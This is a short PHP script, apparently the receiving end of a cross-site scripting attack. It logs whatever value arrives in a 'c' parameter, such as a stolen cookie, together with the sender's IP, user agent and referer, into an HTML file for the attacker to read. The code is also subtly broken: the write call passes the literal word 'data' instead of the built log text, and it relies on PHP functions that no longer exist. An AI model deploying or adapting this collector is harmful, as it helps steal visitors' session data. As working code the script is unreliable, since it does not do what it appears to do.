<?php
//文件名
define('FILE_DATA', "probe_data.html");

@header("Content-Type:text/html;charset=utf-8");

function get_real_ip(){
	// 获取真实IP
	$ip = false;
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	{
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}
	if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
		if ($ip)
		{
			array_unshift($ips, $ip); $ip = FALSE;
		}
		for ($i = 0; $i < count($ips); $i++)
		{
			if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i]))
			{
				$ip = $ips[$i];
				break;
			}
		}
	}
	return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}

function quotes($content) {
	if(get_magic_quotes_gpc()) {
		if(is_array($content)) {
			foreach($content as $key=>$value) {
				$content[$key] = stripslashes($value);
			}
		} else {
			$content = stripslashes($content);
		}
	}
	return htmlspecialchars($content);
}


if (!empty($_REQUEST["c"])) {
	$time = date("Y-m-d H:i:s");
	$ip = get_real_ip();
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$referer = $_SERVER['HTTP_REFERER'];
	$data = $_REQUEST["c"];

	if(!file_exists(FILE_DATA)) {
		$file_content = '<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>probe data</title><style>body{font-size:13px;}</style></head>';
	}

	$file_content .= (
		quotes($ip). " | ". $time. " <br />UserAgent: ".
		quotes($user_agent). " <br />Referer: ".
		quotes($referer). " <br />DATA: ".
		quotes($data)."<br /><br />"
	);

	file_put_contents(FILE_DATA, data, FILE_APPEND);
}

?>
